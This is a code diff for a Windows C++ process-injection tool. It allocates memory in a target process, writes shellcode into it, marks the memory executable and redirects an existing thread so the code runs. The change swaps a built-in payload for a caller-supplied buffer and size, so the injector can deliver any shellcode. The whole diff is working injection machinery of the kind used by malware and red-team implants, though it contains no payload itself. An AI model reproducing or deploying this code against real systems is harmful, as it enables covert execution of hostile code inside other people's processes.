@@ -8,7 +8,6 @@
 #include "ntdll_api.h"
 #include "ntddk.h"
 
-#include "shellcode.h"
 #include "threads_util.h"
 
 bool protect_memory(DWORD pid, LPVOID mem_ptr, SIZE_T mem_size, DWORD protect)
@@ -56,7 +55,7 @@ bool check_ret_target(LPVOID ret)
     return false;
 }
 
-bool run_injected(DWORD pid, ULONGLONG shellcodePtr, DWORD wait_reason)
+bool run_injected(DWORD pid, ULONGLONG shellcodePtr, size_t shellcodeSize, DWORD wait_reason)
 {
     std::cout << "Enumerating threads of PID: " << pid << "\n";
     std::map<DWORD, threads_util::thread_info> threads_info;
@@ -114,7 +113,7 @@ bool run_injected(DWORD pid, ULONGLONG shellcodePtr, DWORD wait_reason)
             std::cout << "Failed to overwrite shellcode jmp back: " << std::hex << GetLastError() << "\n";
             return false;
         }
-        if (!protect_memory(pid, (LPVOID)shellcodePtr, sizeof(g_payload), PAGE_EXECUTE_READ)) {
+        if (!protect_memory(pid, (LPVOID)shellcodePtr, shellcodeSize, PAGE_EXECUTE_READ)) {
             std::cerr << "Failed making memory executable!\n";
             return false;
         }
@@ -130,17 +129,17 @@ bool run_injected(DWORD pid, ULONGLONG shellcodePtr, DWORD wait_reason)
     return is_injected;
 }
 
-LPVOID alloc_memory_in_process(DWORD processID)
+LPVOID alloc_memory_in_process(DWORD processID, const size_t shellcode_size)
 {
     HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
     if (!hProcess) return nullptr;
 
-    LPVOID shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, sizeof(g_payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     CloseHandle(hProcess);
     return shellcodePtr;
 }
 
-bool write_shc_into_process(DWORD processID, LPVOID shellcodePtr)
+bool write_shc_into_process(DWORD processID, LPVOID shellcodePtr, const BYTE *shellc_buf, const size_t shellc_size)
 {
     if (!shellcodePtr) return false;
 
@@ -148,9 +147,9 @@ bool write_shc_into_process(DWORD processID, LPVOID shellcodePtr)
     if (!hProcess) return false;
 
     SIZE_T written = 0;
-    bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, g_payload, sizeof(g_payload), &written);
+    bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, (LPVOID)shellc_buf, shellc_size, &written);
     CloseHandle(hProcess);
-    if (isOk && written == sizeof(g_payload)) {
+    if (isOk && written == shellc_size) {
         return true;
     }
     return false;
